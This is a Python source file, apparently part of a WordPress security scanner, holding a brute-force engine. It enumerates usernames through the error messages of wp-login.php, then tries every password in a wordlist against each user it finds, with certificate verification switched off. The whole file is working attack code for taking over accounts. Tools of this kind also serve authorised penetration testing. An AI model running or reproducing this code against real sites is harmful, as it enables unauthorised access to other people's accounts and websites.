#!/usr/bin/python
# -*- coding: utf-8 -*-
from __future__ import print_function
from __future__ import absolute_import
import requests
import re
import json
import os
import urllib

from .core import *
from .wordpress import *
from multiprocessing import Process, Pool

class Brute_Engine:
	def __init__(self, wordpress, brute):
		if brute != None:

			# Bruteforce username
			if os.path.isfile(brute):
				self.bruteforcing_user(wordpress)

			else:
				if len(wordpress.users) != 0:
					print(notice("Bruteforcing detected users"))
					for user in wordpress.users:
						print(info("User found "+ user['slug']))
						self.bruteforcing_pass(wordpress, user['slug'])

				else:
					print(notice("Bruteforcing " + brute))
					print(info("User found "+ brute))
					self.bruteforcing_pass(wordpress, brute)

			# Exit the bruteforce
			exit()

	"""
	name        : bruteforcing_user(self, wordpress)
	description :
	"""
	def bruteforcing_user(self, wordpress):
		print(notice("Bruteforcing all users"))

		with open('fuzz/wordlist.lst') as data_file:
			data   = data_file.readlines()

			for user in data:
				user = user.strip()
				data = {"log":user, "pwd":"wordpresscan"}
				if not "Invalid username" in requests.post(wordpress.url + "wp-login.php", data=data, verify=False).text:
					print(info("User found "+ user))
					self.bruteforcing_pass(wordpress, user)

	"""
	name        : bruteforcing_pass(self, wordpress)
	description :
	"""
	def bruteforcing_pass(self, wordpress, user):
		print(info("Starting passwords bruteforce for " + user))

		with open('fuzz/wordlist.lst') as data_file:
			data  = data_file.readlines()
			size  = len(data)

			for index, pwd in enumerate(data):
				pwd     = pwd.strip()
				data    = {"log": user, "pwd": pwd}
				percent = int(float(index)/(size)*100)

				print('Bruteforcing - {}{}\r'.format( percent*"▓", (100-percent)*'░' ), end=' ')

				if not "The password you entered" in requests.post(wordpress.url + "wp-login.php", data=data, verify=False).text:
					print(warning("Password found for {} : {}{}".format(user,pwd, ' '*100)))
					break
